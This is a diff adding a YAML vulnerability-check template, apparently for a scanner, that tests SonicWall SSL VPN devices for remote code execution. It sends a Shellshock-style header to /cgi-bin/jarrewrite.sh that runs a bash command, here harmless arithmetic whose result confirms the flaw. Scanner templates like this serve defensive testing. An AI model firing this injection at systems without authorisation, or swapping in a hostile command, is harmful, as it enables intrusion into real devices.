@@ -1,0 +1,23 @@
+name: yaml-poc-sonicwall-ssl_vpn-rce-CT-158488
+binding: 4a1a8c8c-6300-446b-b0a3-e3314b5d5932
+detail:
+    author: system_user
+    vulnerability:
+        id: d65ecd1c-3157-4278-99c2-a2506cbceb31
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(1140000, 1144800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /cgi-bin/jarrewrite.sh
+            headers:
+                X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
+expression: r0()
